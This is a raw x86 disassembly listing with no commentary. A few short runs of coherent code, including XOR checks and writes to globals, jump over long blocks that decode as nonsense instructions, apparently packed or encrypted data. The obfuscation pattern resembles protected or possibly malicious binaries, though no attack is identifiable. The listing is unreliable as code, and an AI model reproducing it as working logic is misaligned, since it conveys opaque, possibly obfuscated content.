  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43366f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43362f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	xchg   BYTE PTR [ebx],dl
  407497:	sbb    DWORD PTR [esi-0x5c],0x207e7ec0
  40749e:	jge    0x40751e
  4074a0:	jle    0x4074cf
  4074a2:	add    DWORD PTR ds:0x7e55d57a,eax
  4074a8:	dec    ebx
  4074a9:	ret    
  4074aa:	or     BYTE PTR [edi+0x5560ba69],cl
  4074b0:	mov    WORD PTR [esi-0x7a4ba438],?
  4074b6:	lock ror DWORD PTR ds:[edx+edi*2-0x31],cl
  4074bc:	hlt    
  4074bd:	in     eax,dx
  4074be:	aas    
  4074bf:	fisub  WORD PTR [edi]
  4074c1:	push   ebp
  4074c2:	stos   BYTE PTR es:[edi],al
  4074c3:	jmp    0x4074de
  4074c5:	sub    al,0x61
  4074c7:	stc    
  4074c8:	fsubr  st(1),st
  4074ca:	inc    eax
  4074cb:	in     al,dx
  4074cc:	out    0x66,eax
  4074ce:	test   al,0x4a
  4074d0:	cmp    DWORD PTR [ebx],0x5e
  4074d3:	push   cs
  4074d4:	sar    DWORD PTR [eax+0x26],cl
  4074d7:	jno    0x407485
  4074d9:	sub    eax,0x71c7ac3d
  4074de:	mov    dh,0xe0
  4074e0:	icebp  
  4074e1:	in     al,dx
  4074e2:	dec    ecx
  4074e3:	loopne 0x407519
  4074e5:	sbb    al,0x1f
  4074e7:	or     al,0x3b
  4074e9:	xor    ebx,DWORD PTR [edi]
  4074eb:	sbb    DWORD PTR [edi],ebp
  4074ed:	xchg   ebx,eax
  4074ee:	fsubr  st(1),st
  4074f0:	outs   dx,DWORD PTR ds:[esi]
  4074f1:	xchg   ecx,eax
  4074f2:	into   
  4074f3:	mov    DWORD PTR [esi],edi
  4074f5:	mov    ecx,0xe723e30f
  4074fa:	pop    edx
  4074fb:	aam    0x42
  4074fd:	and    ebx,DWORD PTR [edi-0x41]
  407500:	mov    edx,0x62039f31
  407505:	inc    eax
  407506:	jae    0x4074ee
  407508:	dec    esp
  407509:	neg    BYTE PTR [edx]
  40750b:	pop    ebx
  40750c:	or     ecx,esi
  40750e:	ins    DWORD PTR es:[edi],dx
  40750f:	push   ebp
  407510:	(bad)  
  407511:	mov    ds:0x85816692,eax
  407516:	mov    ah,0x30
  407518:	in     al,0x55
  40751a:	pop    esi
  40751b:	cmp    eax,0x68e4ebe4
  407520:	mov    esp,0x85cf50bc
  407525:	mov    bh,0x6c
  407527:	pop    edi
  407528:	mov    eax,ds:0xd36448e7
  40752d:	inc    esp
  40752e:	sub    dl,bl
  407530:	into   
  407531:	sbb    eax,0x41e062bd
  407536:	mov    ds:0xa207b9ce,al
  40753b:	lea    edx,[esi]
  40753d:	push   es
  40753e:	iret   
  40753f:	(bad)  
  407540:	daa    
  407541:	cmp    DWORD PTR [ebp+0xa],ecx
  407544:	jp     0x4075b6
  407546:	aam    0x15
  407548:	cmp    ebx,DWORD PTR [esp+ebp*4-0x44]
  40754c:	pop    edi
  40754d:	iret   
  40754e:	outs   dx,BYTE PTR ds:[esi]
  40754f:	xor    esp,ecx
  407551:	retf   0x9544
  407554:	pusha  
  407555:	xor    eax,0xa9ce77a1
  40755a:	mov    dh,BYTE PTR ds:0x904121d0
  407560:	lock call 0x4ac4:0x4095a6a2
  407568:	aaa    
  407569:	ud2    
  40756b:	add    cl,BYTE PTR [ebx-0x56920c42]
  407571:	inc    edi
  407572:	sar    DWORD PTR [eax-0x58],1
  407575:	inc    eax
  407576:	inc    edi
  407577:	sbb    ah,BYTE PTR [edi-0x73]
  40757a:	push   edi
  40757b:	cmp    ebp,ebx
  40757d:	inc    esp
  40757e:	push   ds
  40757f:	adc    BYTE PTR [esi-0x5e],bl
  407582:	imul   edi,eax,0xffffffac
  407585:	jo     0x4075c8
  407587:	test   BYTE PTR [ecx+0x17ea25d2],dl
  40758d:	ins    DWORD PTR es:[edi],dx
  40758e:	push   ebx
  40758f:	add    ecx,DWORD PTR [ecx]
  407591:	push   eax
  407592:	pop    ebp
  407594:	aaa    
  407595:	inc    eax
  407596:	cmp    eax,0x9a80eb10
  40759b:	lock pop esp
  40759d:	sar    BYTE PTR [ebx],0xa
  4075a0:	push   0x77edbec3
  4075a5:	cwde   
  4075a6:	push   0xffffffcc
  4075a8:	ret    0x3fa1
  4075ab:	push   esi
  4075ac:	pop    ecx
  4075ad:	jmp    0xeaa8:0x14f13703
  4075b4:	cwde   
  4075b5:	ja     0x4075cf
  4075b7:	test   al,0x37
  4075b9:	rcr    ah,0xcb
  4075bc:	sbb    al,0xd
  4075be:	pop    ds
  4075bf:	ins    DWORD PTR es:[edi],dx
  4075c0:	sub    BYTE PTR [esi+0x34],0x8b
  4075c4:	pop    edi
  4075c5:	sbb    al,0x1b
  4075c7:	rol    DWORD PTR [edi],cl
  4075c9:	inc    ebp
  4075ca:	fst    QWORD PTR [esp+edi*2+0x25ced2d8]
  4075d1:	rol    BYTE PTR [ebx+0x73],1
  4075d4:	adc    BYTE PTR [bx+0x3],dl
  4075d8:	push   esp
  4075d9:	sub    dh,cl
  4075db:	pop    ebp
  4075dc:	mov    cl,0x60
  4075de:	jb     0x407646
  4075e0:	cli    
  4075e1:	inc    edi
  4075e2:	mov    ecx,0xcd1ad09e
  4075e7:	cmp    eax,0x5534b51c
  4075ec:	loopne 0x4075d1
  4075ee:	dec    ebx
  4075ef:	clc    
  4075f0:	inc    eax
  4075f1:	retf   
  4075f2:	add    bh,BYTE PTR [edx+eiz*4-0x61]
  4075f6:	rol    BYTE PTR [ecx-0x74e1104f],1
  4075fc:	jb     0x407665
  4075fe:	mov    bh,0xbe
  407600:	add    eax,0xfadb0cc8
  407605:	xchg   ecx,eax
  407606:	fcmovnb st,st(5)
  407608:	(bad)  
  407609:	fistp  DWORD PTR [eax]
  40760b:	inc    ecx
  40760c:	dec    eax
  40760d:	les    esi,FWORD PTR [edx]
  40760f:	jp     0x4075ab
  407611:	adc    eax,0x98977f1e
  407616:	xor    BYTE PTR [edi+0x0],bl
  407619:	and    al,0xa2
  40761b:	xor    DWORD PTR [edi],edx
  40761d:	xchg   ebx,eax
  40761e:	call   0x610f540d
  407623:	push   ecx
  407624:	gs aaa 
  407626:	jnp    0x407655
  407628:	test   ch,0x64
  40762b:	mov    ds:0xb7885be5,eax
  407631:	aad    0x8e
  407633:	cmp    al,0x52
  407635:	jbe    0x407675
  407637:	mov    gs,ebp
  407639:	sub    edi,0x4e
  40763c:	icebp  
  40763d:	pop    edx
  40763e:	mov    ss,WORD PTR [ecx+0x69]
  407641:	ins    BYTE PTR es:[edi],dx
  407642:	pop    esi
  407643:	(bad)  
  407644:	xor    dh,BYTE PTR [edi]
  407646:	out    0x69,al
  407648:	aaa    
  407649:	sbb    al,0x7e
  40764b:	dec    ebp
  40764c:	push   eax
  40764d:	jle    0x407696
  40764f:	ss inc ebp
  407651:	or     bl,BYTE PTR [edi]
  407653:	iret   
  407654:	in     eax,0x9
  407656:	sti    
  407657:	lds    ecx,FWORD PTR [esi]
  407659:	mov    al,ds:0xefda919a
  40765e:	gs and al,0x75
  407661:	adc    eax,0x1595fd7
  407666:	mov    ebp,0x6845062a
  40766b:	xchg   ebp,eax
  40766c:	adc    eax,DWORD PTR [ecx+0x9c7a6d9]
  407672:	daa    
  407673:	xchg   edx,eax
  407674:	fild   QWORD PTR [ebp-0x56]
  407677:	imul   esi
  407679:	or     BYTE PTR cs:[edi-0x1fbd48e2],dh
  407680:	retf   
  407681:	fdiv   st,st(6)
  407683:	mov    esp,0xfbdfc580
  407688:	adc    ebx,edi
  40768a:	mov    dh,0xac
  40768c:	xchg   edi,eax
  40768d:	rcr    DWORD PTR [eax-0x3c553505],1
  407693:	pop    edx
  407694:	push   edx
  407695:	loopne 0x407623
  407697:	cmp    al,0xd6
  407699:	inc    edi
  40769a:	add    BYTE PTR [ebp+0x2faff749],ah
  4076a0:	pop    eax
  4076a1:	sbb    ch,BYTE PTR [ecx-0xc05829a]
  4076a7:	add    DWORD PTR [edx],esp
  4076a9:	adc    BYTE PTR [edi],dh
  4076ab:	adc    eax,0x10346416
  4076b0:	xlat   BYTE PTR ds:[ebx]
  4076b1:	and    cl,0xf8
  4076b4:	add    eax,0x2f3981c2
  4076b9:	inc    edx
  4076ba:	add    DWORD PTR [ebx-0x3fdb6688],esp
  4076c0:	ss int 0x3c
  4076c3:	jl     0x40767d
  4076c5:	sbb    eax,0x6e3c9f69
  4076ca:	dec    ebp
  4076cb:	out    0x82,al
  4076cd:	mov    al,0x9d
  4076cf:	adc    DWORD PTR [ecx+0x35108fb],0x7f7b1220
  4076d9:	mov    bh,0x9d
  4076db:	div    BYTE PTR [ebx+0x6207af5a]
  4076e1:	mov    ?,WORD PTR [ebx+0x7e095d53]
  4076e7:	push   ss
  4076e8:	out    0x70,eax
  4076ea:	dec    ebx
  4076eb:	mov    edx,0x3449baf1
  4076f0:	sahf   
  4076f1:	mov    bh,0x68
  4076f3:	(bad)  
  4076f4:	pop    ss
  4076f5:	in     al,dx
  4076f6:	rcr    BYTE PTR [ebx],0x66
  4076f9:	pop    esp
  4076fa:	fs mov dh,0xd9
  4076fd:	sahf   
  4076fe:	adc    al,0xd6
  407700:	add    DWORD PTR [ecx],eax
  407702:	aad    0xf6
  407704:	dec    ecx
  407705:	jne    0x4076b2
  407707:	and    DWORD PTR [ecx+0x2aaa3729],esi
  40770d:	push   edi
  40770e:	mov    DWORD PTR [edi+0x64],ecx
  407711:	xchg   esp,eax
  407712:	icebp  
  407713:	in     eax,0x30
  407715:	jno    0x407725
  407717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407718:	aaa    
  407719:	and    eax,0xfada19db
  40771e:	adc    ch,ch
  407720:	jecxz  0x4076d4
  407722:	xor    eax,0x75f1e9da
  407727:	mov    ds:0xdb9b04e3,eax
  40772c:	mov    esp,0x282196c5
  407731:	fwait
  407732:	add    eax,0x3a8da844
  407737:	out    0xd0,al
  407739:	iret   
  40773a:	(bad)  [eax-0x77861e20]
  407740:	dec    eax
  407741:	stos   BYTE PTR es:[edi],al
  407742:	mov    edi,0x763c06a5
  407747:	test   eax,0x5f897e15
  40774c:	adc    BYTE PTR [ebx+0xf],bl
  40774f:	call   0xbd58:0xfcf919b6
  407756:	push   ecx
  407757:	inc    edi
  407758:	ror    DWORD PTR [edi+eiz*1+0x27],cl
  40775c:	scas   al,BYTE PTR es:[edi]
  40775d:	sbb    ecx,ebx
  40775f:	add    DWORD PTR [edi+0x28],ebx
  407762:	daa    
  407763:	ror    BYTE PTR ds:0x37b6e81c,0x72
  40776a:	test   al,0xb5
  40776c:	and    DWORD PTR [edi+0x31d8edaa],ebx
  407772:	gs pop ebx
  407774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407775:	mov    ebp,?
  407777:	cdq    
  407778:	pop    ecx
  407779:	test   BYTE PTR [esp+ecx*2+0x2c6d8b8],dl
  407780:	outs   dx,BYTE PTR ds:[esi]
  407781:	jg     0x4077c6
  407783:	scas   eax,DWORD PTR es:[edi]
  407784:	adc    DWORD PTR [edi+0x21dbf987],0xffffffe5
  40778b:	inc    edx
  40778c:	add    DWORD PTR [eax-0x2da818a],edx
  407792:	out    dx,eax
  407793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407794:	lock or ch,BYTE PTR [ebx+esi*4-0x53edc1a9]
  40779c:	cmp    eax,0x1009dc5d
  4077a1:	out    0x51,al
  4077a3:	jle    0x40775f
  4077a5:	push   ss
  4077a6:	ds test al,0xa
  4077a9:	jnp    0x407742
  4077ab:	es adc al,0x36
  4077ae:	xchg   BYTE PTR [eax-0x13a2d498],ch
  4077b4:	inc    eax
  4077b5:	mul    DWORD PTR [ebp-0xac88b1d]
  4077bb:	aad    0x3e
  4077bd:	mov    dh,0x27
  4077bf:	jne    0x40779d
  4077c1:	xor    al,0x51
  4077c3:	mov    ah,0x99
  4077c5:	pop    ecx
  4077c6:	out    dx,al
  4077c7:	ss push cs
  4077c9:	fcom   st(5)
  4077cb:	fimul  DWORD PTR [edi-0x6c]
  4077ce:	jecxz  0x40775b
  4077d0:	dec    ebp
  4077d1:	cld    
  4077d2:	mov    DWORD PTR ds:0x4336a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	sub    BYTE PTR [ebp-0x30a9e425],0x7e
  4077fb:	jle    0x40781d
  4077fd:	jge    0x40787d
  4077ff:	jle    0x407820
  407801:	stos   BYTE PTR es:[edi],al
  407802:	add    eax,DWORD PTR [ebx+ebx*4-0x708f9e91]
  407809:	(bad)  
  40780a:	dec    esi
  40780b:	or     BYTE PTR [eax],dh
  40780d:	out    dx,al
  40780e:	out    dx,eax
  40780f:	cmp    edx,DWORD PTR [edi-0x4b123389]
  407815:	xor    al,0x14
  407817:	lds    esp,FWORD PTR [eax+0x25325ae4]
  40781d:	dec    esi
  40781e:	inc    ecx
  40781f:	fcmove st,st(0)
  407821:	add    DWORD PTR [ebp+0x5d],ebp
  407824:	xor    eax,DWORD PTR [ebx*1+0x55563be4]
  40782b:	mov    esp,0xdc7527a9
  407830:	mov    DWORD PTR [edi+esi*1+0x3d4284bf],edx
  407837:	pop    esi
  407838:	mov    ch,0x73
  40783a:	jbe    0x40788f
  40783c:	push   ecx
  40783d:	call   0xeff9:0xc56e0564
  407844:	cmp    eax,0x98d9b860
  407849:	push   0xffffff97
  40784b:	sbb    edx,DWORD PTR [ebx+esi*4-0x66]
  40784f:	in     eax,dx
  407850:	jl     0x4077d2
  407852:	jb     0x40787e
  407854:	ins    DWORD PTR es:[edi],dx
  407855:	arpl   WORD PTR [esi-0x62],bp
  407858:	popa   
  407859:	cs out 0x98,eax
  40785c:	add    al,0x50
  40785e:	aam    0xdf
  407860:	cdq    
  407861:	imul   edi,DWORD PTR [edx],0xfad8244e
  407867:	icebp  
  407868:	repz push DWORD PTR [eax+0x3]
  40786c:	sbb    DWORD PTR [ecx-0x1a3fe40f],esp
  407872:	dec    edx
  407873:	aam    0x79
  407875:	ja     0x407869
  407877:	mov    ebx,0xc1f50cc1
  40787c:	dec    esi
  40787d:	and    dh,BYTE PTR [esi-0x3fddb9e4]
  407883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407884:	ja     0x407889
  407886:	mov    bh,0x2b
  407888:	daa    
  407889:	and    ah,BYTE PTR [eax]
  40788b:	(bad)  
  40788e:	push   ecx
  40788f:	sbb    bh,BYTE PTR [eax-0x7c]
  407892:	jb     0x4078d4
  407894:	dec    edx
  407895:	or     edi,esp
  407897:	stos   BYTE PTR es:[edi],al
  407898:	in     al,0x39
  40789a:	cmc    
  40789b:	pop    ecx
  40789c:	sub    eax,0xcd5d7d59
  4078a1:	repnz popa 
  4078a3:	sub    ebp,ecx
  4078a5:	mov    ds,WORD PTR [si-0x39c5]
  4078aa:	mov    esi,0x3f92ad80
  4078af:	sub    BYTE PTR [ebp-0x46e65b60],ch
  4078b5:	dec    ebp
  4078b6:	pop    ebp
  4078b7:	loopne 0x4078df
  4078b9:	std    
  4078ba:	mov    dh,0x66
  4078bc:	lods   eax,DWORD PTR ds:[esi]
  4078bd:	std    
  4078be:	inc    edx
  4078bf:	dec    edi
  4078c0:	ror    cl,0xdc
  4078c3:	jo     0x40784b
  4078c5:	mov    cl,BYTE PTR [ebx]
  4078c7:	jmp    FWORD PTR [esi]
  4078c9:	push   esp
  4078ca:	mov    DWORD PTR [ecx-0x33],eax
  4078cd:	fadd   QWORD PTR [esi-0x3ea12bc]
  4078d3:	test   eax,ecx
  4078d5:	push   esi
  4078d6:	jb     0x40794b
  4078d8:	stc    
  4078d9:	outs   dx,BYTE PTR ds:[esi]
  4078da:	or     edx,DWORD PTR [edi]
  4078dc:	aad    0x50
  4078de:	pop    ds
  4078df:	repnz or DWORD PTR [edx+ebp*8],ebx
  4078e3:	cli    
  4078e4:	lea    ebp,[ecx+0x1]
  4078e7:	and    bh,BYTE PTR [ecx]
  4078e9:	jl     0x4078b0
  4078eb:	or     edi,eax
  4078ed:	sbb    DWORD PTR [edx+0x16f74783],0xfffffffa
  4078f4:	mov    bl,0x1e
  4078f6:	inc    ebx
  4078f7:	adc    BYTE PTR [eax-0x3f],0xb3
  4078fb:	outs   dx,BYTE PTR ds:[esi]
  4078fc:	fldcw  WORD PTR [ebp-0xde1fb29]
  407902:	jb     0x4078b5
  407904:	xchg   esp,eax
  407905:	push   0x964990e0
  40790a:	mov    bh,0xe5
  40790c:	les    edi,FWORD PTR [ecx]
  40790e:	pop    ss
  40790f:	add    DWORD PTR [edx],0x75
  407912:	mov    eax,0x1096c406
  407917:	cmp    DWORD PTR [ebx+0x41],edi
  40791a:	mov    esi,0xa3329bb5
  40791f:	aad    0x70
  407921:	mov    ebx,0x8b41b8bd
  407926:	xor    BYTE PTR [eax+0x22],bh
  407929:	imul   edi,ebp,0x68108289
  40792f:	push   es
  407930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407931:	rcl    DWORD PTR [edx],0xa1
  407934:	ret    
  407935:	sub    ch,BYTE PTR [eax+edi*1+0x7ebf216b]
  40793c:	fld    TBYTE PTR [eax]
  40793e:	imul   ebp,DWORD PTR [edi+edx*2],0x22e74c7b
  407945:	pop    esp
  407946:	mov    DWORD PTR [ebp+0x498456d9],eax
  40794c:	mov    ecx,0xb724144d
  407951:	xor    ah,bh
  407953:	mov    ds:0x24fcc8f9,eax
  407958:	xchg   esp,eax
  407959:	add    eax,0xedd34bbf
  40795e:	jae    0x4079a7
  407960:	mov    ebp,0x31770a55
  407965:	mov    esi,DWORD PTR [ecx]
  407967:	mov    cl,0xf
  407969:	pop    edx
  40796a:	adc    esi,DWORD PTR [ebx-0x64]
  40796d:	das    
  40796e:	mov    bh,0x15
  407970:	dec    esp
  407971:	fsubr  st,st(6)
  407974:	push   0xa420aad9
  407979:	add    dh,bh
  40797b:	add    ah,dl
  40797d:	popf   
  40797e:	sar    DWORD PTR [ebx],0xd4
  407981:	les    ebp,FWORD PTR [ecx-0x1eecf995]
  407987:	add    ebp,DWORD PTR [edx]
  407989:	jno    0x40795d
  40798b:	and    eax,DWORD PTR [edx+ebx*4]
  40798e:	push   eax
  40798f:	sbb    bh,dl
  407991:	test   BYTE PTR [esi-0x55c11a30],cl
  407997:	icebp  
  407998:	pop    ecx
  407999:	mov    ?,WORD PTR [edx-0x4e]
  40799c:	scas   eax,DWORD PTR es:[edi]
  40799d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40799e:	mov    cl,0xbb
  4079a0:	adc    bh,BYTE PTR [edx+eax*4+0xd0ae412]
  4079a7:	and    DWORD PTR [edi],ebp
  4079a9:	fwait
  4079aa:	sbb    DWORD PTR [bx],ebp
  4079ad:	push   esi
  4079ae:	jecxz  0x4079a8
  4079b0:	test   al,0x17
  4079b2:	retf   
  4079b3:	unpcklps xmm1,XMMWORD PTR [eax]
  4079b6:	sbb    ah,0xfe
  4079b9:	rol    esi,cl
  4079bb:	ss sbb al,0x7
  4079be:	fistp  WORD PTR [ecx+ecx*4-0x3f]
  4079c2:	dec    esp
  4079c3:	add    eax,0xf9faa66f
  4079c8:	sub    edi,DWORD PTR [edx]
  4079ca:	out    dx,eax
  4079cb:	mov    esi,0x15089ae4
  4079d0:	arpl   WORD PTR [edx],sp
  4079d2:	jae    0x407a51
  4079d4:	fld    DWORD PTR [eax]
  4079d6:	fcomi  st,st(6)
  4079d8:	das    
  4079d9:	into   
  4079da:	clc    
  4079db:	sub    DWORD PTR [esi],0xd0f21958
  4079e1:	pop    esi
  4079e2:	repz push eax
  4079e4:	adc    eax,0x7e369762
  4079e9:	neg    ah
  4079eb:	sbb    ch,BYTE PTR [eax-0x34d37bd4]
  4079f1:	jge    0x407a11
  4079f3:	loopne 0x4079d8
  4079f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f6:	add    DWORD PTR [ebx+0x1e],ebp
  4079f9:	imul   ebx,DWORD PTR [edx+0x17],0xf29028b7
  407a00:	test   eax,0x21895243
  407a05:	jmp    0xabcc2f19
  407a0a:	inc    ecx
  407a0b:	leave  
  407a0c:	jg     0x407a70
  407a0e:	add    BYTE PTR [ecx],cl
  407a10:	cmp    BYTE PTR [esi],dl
  407a12:	test   DWORD PTR [eax-0xa],esi
  407a15:	mov    dh,0x4d
  407a17:	mov    ah,0xd3
  407a19:	stos   BYTE PTR es:[edi],al
  407a1a:	cmp    bl,ch
  407a1c:	sub    DWORD PTR [esi],edi
  407a1e:	pop    ebx
  407a1f:	or     DWORD PTR [ecx-0x56],0xffffff8b
  407a23:	int    0xdb
  407a25:	out    dx,eax
  407a26:	push   edx
  407a27:	je     0x407a9f
  407a29:	xchg   cl,dh
  407a2b:	imul   edx,DWORD PTR [eax-0xff6d65],0x2c9a32ca
  407a35:	jo     0x4079e9
  407a37:	bnd jae 0x407a11
  407a3a:	mov    dl,0x47
  407a3c:	xchg   esi,eax
  407a3d:	jne    0x407a02
  407a3f:	imul   eax,DWORD PTR [edx+0x1a],0x58
  407a43:	sub    eax,DWORD PTR [edi-0x74]
  407a46:	ret    
  407a47:	cmp    eax,0xdaa0ad09
  407a4c:	cmp    edx,edx
  407a4e:	in     al,0x3c
  407a50:	data16 mov ah,0xff
  407a53:	fdiv   QWORD PTR [edi+0x42]
  407a56:	sbb    DWORD PTR [ecx-0x7a9707cd],0xdd640ba0
  407a60:	repnz lods eax,DWORD PTR ds:[esi]
  407a62:	inc    ebx
  407a63:	fst    DWORD PTR [edx+0x34]
  407a66:	es push ds
  407a68:	xchg   ecx,esp
  407a6a:	aaa    
  407a6b:	or     eax,0xe396c1d1
  407a70:	xor    eax,0x39b21e05
  407a75:	add    BYTE PTR [edi+0x1b],dl
  407a78:	mov    ds,WORD PTR [ecx+0xa]
  407a7b:	xor    eax,0xe202cfba
  407a80:	outs   dx,DWORD PTR ds:[esi]
  407a81:	ret    0x380
  407a84:	xchg   edx,eax
  407a85:	daa    
  407a86:	ror    DWORD PTR [ebx+0x78286e24],1
  407a8c:	or     al,0xb7
  407a8e:	(bad)  
  407a8f:	mov    al,ds:0x161fac8f
  407a94:	add    eax,0x46ca6c8a
  407a99:	adc    DWORD PTR [ebx+0x78],esp
  407a9c:	cdq    
  407a9d:	in     al,dx
  407a9e:	in     eax,dx
  407a9f:	cmp    BYTE PTR [edi],0x1f
  407aa2:	aam    0x9f
  407aa4:	add    cl,BYTE PTR ds:0x5230b2e6
  407aaa:	js     0x407a3e
  407aac:	mov    ecx,0xb74bcb79
  407ab1:	stos   BYTE PTR es:[di],al
  407ab3:	xor    BYTE PTR [esi-0x20135356],dl
  407ab9:	repz js 0x407ac5
  407abc:	call   0x99dec3ab
  407ac1:	sbb    al,0x6
  407ac3:	jno    0x407b06
  407ac5:	test   al,0x1c
  407ac7:	inc    ebx
  407ac8:	push   eax
  407ac9:	inc    ebx
  407aca:	fdivp  st(1),st
  407acc:	sbb    BYTE PTR [esi],bl
  407ace:	out    dx,eax
  407acf:	xor    al,0xc2
  407ad1:	neg    BYTE PTR [edx-0x45]
  407ad4:	dec    edx
  407ad5:	ror    BYTE PTR [ecx+0x68a67f47],1
  407adb:	bound  ecx,QWORD PTR [edx-0x33]
  407ade:	cmp    eax,0x55b1698a
  407ae3:	jle    0x407b32
  407ae5:	pop    ecx
  407ae6:	pop    es
  407ae7:	adc    dl,bl
  407ae9:	popf   
  407aea:	mov    esp,0x7f357018
  407aef:	or     dl,al
  407af1:	ret    
  407af2:	imul   esp,edi,0x48
  407af5:	sbb    DWORD PTR [ebx],esi
  407af7:	sbb    ebx,DWORD PTR [esi-0xe]
  407afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407afc:	(bad)  
  407afd:	mov    bl,0x26
  407aff:	(bad)  
  407b00:	mov    ch,0x75
  407b02:	(bad)  
  407b03:	icebp  
  407b04:	push   ds
  407b05:	jno    0x407b76
  407b07:	test   ah,cl
  407b09:	and    DWORD PTR [eax],esi
  407b0b:	loop   0x407b52
  407b0d:	and    eax,0x7823e4fa
  407b12:	outs   dx,DWORD PTR ds:[esi]
  407b13:	test   ecx,ebx
  407b15:	mov    ch,0x93
  407b17:	pop    edx
  407b18:	inc    ecx
  407b19:	mov    eax,0x6a941fbd
  407b1e:	pop    es
  407b1f:	mov    al,ds:0xa31e32dc
  407b24:	push   DWORD PTR [ebx+0x649057c3]
  407b2a:	jbe    0x407afc
  407b2c:	push   ebx
  407b2d:	bound  edi,QWORD PTR [ebx]
  407b2f:	enter  0x850f,0xc6
  407b33:	add    eax,DWORD PTR [eax]
  407b35:	add    BYTE PTR [esi-0x75],ah
  407b38:	inc    ebp
  407b39:	clc    
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433623,0x433667
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433703,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43362b,0x433727
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43373b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4336fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x74f6a3a4,al
  407ba8:	jmp    0x7e7e:0xcb78e588
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407be1
  407bb4:	les    edx,FWORD PTR [edi-0x46]
  407bb7:	or     DWORD PTR [ecx-0x60],0x43
  407bbb:	or     eax,0x52ff43f3
  407bc0:	adc    BYTE PTR [eax-0x44],bl
  407bc3:	jecxz  0x407c10
  407bc5:	mov    al,0x19
  407bc7:	test   al,0x2c
  407bc9:	cmp    eax,DWORD PTR [esi-0x62]
  407bcc:	or     ecx,0x79
  407bcf:	and    BYTE PTR [edi-0x4e],bh
  407bd2:	cs xor bl,al
  407bd5:	enter  0x331c,0xa4
  407bd9:	js     0x407c52
  407bdb:	fbld   TBYTE PTR [esi]
  407bdd:	push   ds
  407bde:	out    dx,eax
  407bdf:	inc    eax
  407be0:	xchg   edx,eax
  407be1:	mov    dh,0xcc
  407be3:	out    0xfe,al
  407be5:	cmp    al,0x74
  407be7:	gs aaa 
